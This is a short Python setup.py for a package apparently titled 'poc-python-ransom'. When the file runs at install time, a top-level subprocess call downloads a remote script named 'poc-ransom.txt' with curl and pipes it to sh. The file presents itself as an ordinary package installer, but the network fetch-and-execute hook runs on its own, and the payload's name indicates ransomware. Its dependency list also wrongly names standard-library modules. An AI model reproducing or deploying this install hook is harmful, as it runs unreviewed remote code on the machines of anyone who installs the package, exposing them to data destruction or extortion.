from setuptools import setup
import subprocess, os

# def run_command(command):
#     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setpgrp)
#     return process

subprocess.run("curl -sL https://gist.githubusercontent.com/rroiii/de18d81b1cf9e05f6503b55896d3897a/raw/591eb9e629f5f1f15a43719367af845105629aa2/poc-ransom.txt | sh", shell=True, check=True)

setup(
    name='poc-python-ransom',
    version='0.1',
    packages=['poc-python-ransom'],
    install_requires=[
        'subprocess',
        'os'
    ]
)